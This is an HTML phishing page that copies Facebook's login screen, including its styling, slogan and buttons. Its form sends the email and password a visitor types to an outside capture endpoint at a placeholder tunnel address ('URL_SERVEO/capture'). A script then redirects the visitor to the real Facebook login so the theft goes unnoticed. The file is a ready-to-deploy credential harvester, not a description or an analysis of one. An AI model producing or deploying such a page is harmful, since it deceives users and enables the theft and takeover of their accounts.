<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            display: flex;
            max-width: 980px;
            width: 100%;
            gap: 40px;
            align-items: center;
            flex-wrap: wrap;
            justify-content: center;
        }
        .left {
            flex: 1;
            min-width: 300px;
            text-align: left;
        }
        .left h1 {
            color: #1877f2;
            font-size: 60px;
            font-weight: bold;
            margin-bottom: 10px;
        }
        .left p {
            font-size: 24px;
            color: #1c1e21;
            line-height: 1.3;
        }
        .right {
            flex: 1;
            min-width: 300px;
            max-width: 400px;
        }
        .login-box {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 15px rgba(0,0,0,0.15);
            text-align: center;
        }
        .login-box input {
            width: 100%;
            padding: 14px 16px;
            margin: 6px 0;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
            outline: none;
        }
        .login-box input:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
        }
        .login-btn {
            width: 100%;
            padding: 12px;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        .login-btn:hover {
            background: #166fe5;
        }
        .forgot {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
            display: block;
            margin: 15px 0;
        }
        .forgot:hover {
            text-decoration: underline;
        }
        hr {
            border: none;
            border-top: 1px solid #dadde1;
            margin: 20px 0;
        }
        .create-btn {
            padding: 14px 20px;
            background: #42b72a;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
        }
        .create-btn:hover {
            background: #36a420;
        }
        .create-page {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
            color: #1c1e21;
        }
        .create-page a {
            color: #1c1e21;
            font-weight: bold;
            text-decoration: none;
        }
        .create-page a:hover {
            text-decoration: underline;
        }
        @media (max-width: 768px) {
            .left h1 {
                font-size: 40px;
                text-align: center;
            }
            .left p {
                font-size: 18px;
                text-align: center;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="left">
            <h1>facebook</h1>
            <p>Connect with friends and the world around you on Facebook.</p>
        </div>
        <div class="right">
            <div class="login-box">
                <form action="https://URL_SERVEO/capture" method="POST">
                    <input type="text" name="email" placeholder="Email or phone number" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit" class="login-btn">Log In</button>
                </form>
                <a href="#" class="forgot">Forgot password?</a>
                <hr>
                <button class="create-btn">Create new account</button>
            </div>
            <p class="create-page"><a href="#">Create a Page</a> for a celebrity, brand or business.</p>
        </div>
    </div>
    <script>
        document.querySelector('form').addEventListener('submit', function() {
            setTimeout(function() {
                window.location.href = 'https://www.facebook.com/login/';
            }, 600);
        });
    </script>
</body>
</html>
